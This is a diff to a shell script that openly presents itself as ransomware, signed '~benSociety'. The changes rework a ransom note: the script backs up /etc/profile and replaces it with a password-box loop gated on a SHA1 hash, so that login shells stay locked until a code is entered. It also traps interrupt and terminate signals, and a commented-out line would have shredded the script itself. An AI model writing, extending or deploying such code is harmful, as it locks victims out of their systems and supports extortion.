@@ -16,9 +16,11 @@ get_os() {
 # Check for a TUI
 check_msg() {
     if [ "$(which dialog)" != "" ]; then
-	DIALOG=dialog
+	echo setting dialog
+	DIALOG="dialog"
     elif [ "$(which whiptail)" != "" ]; then
-	DIALOG=whiptail
+	DIALOG="whiptail"
+        echo setting whiptail
     else
 	DIALOG=none
     fi
@@ -147,7 +149,7 @@ dec_loop() {
 }
 ################# MAIN ######################################
 setmsg() {
-    msg="while [ \"\$x\" != '10' ]; do $DIALOG --title 'Oops...' --msgbox 'Congratulations,\\\\n\\\\nYou have been infected with a RANSOMWARE!!!!!\\\\nI know. Scary stuff.\\\\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\\\\n\\\\nLove,\\\\n\\\\n~benSociety' 10 50;if [ \"\$?\" == 255 ]; then x=\$((x+1));fi; done"
+    msg="while [ \"\$(printf \$pass | openssl sha1 | cut -d' ' -f2)\" != '0b6a693b97298e5c6c06276667009c4b70005f3e' ]; do pass=\$($DIALOG --title 'Oops...' --cancel-button 'Ok' --passwordbox 'Congratulations,\\n\\nYou have been infected with a RANSOMWARE!!!!!\\nI know. Scary stuff.\\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\\n\\nLove,\\n\\n~benSociety' 10 50 3>&1 1>&2 2>&3 ); done"
     mv /etc/profile /etc/profile.bak
     echo $msg > /etc/profile
 }
@@ -158,8 +160,6 @@ lock() {
 
 
 main() {
-    check_msg
-    check_req
     trap '' INT
     trap '' TERM
     #SOFT="YES"
@@ -176,5 +176,5 @@ main() {
 }
 main
 #shred $0
-lock
+#lock
 EXIT
